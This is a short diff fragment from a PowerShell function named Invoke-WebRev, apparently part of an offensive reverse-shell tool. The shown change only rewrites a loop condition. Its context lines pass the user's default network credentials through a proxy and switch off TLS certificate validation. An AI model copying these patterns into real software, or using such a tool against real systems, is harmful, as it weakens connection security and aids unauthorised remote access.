@@ -37,7 +37,7 @@ function Invoke-WebRev{
     (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
-    while (1 -eq 1)
+    while ($true)
     {
         try
         {
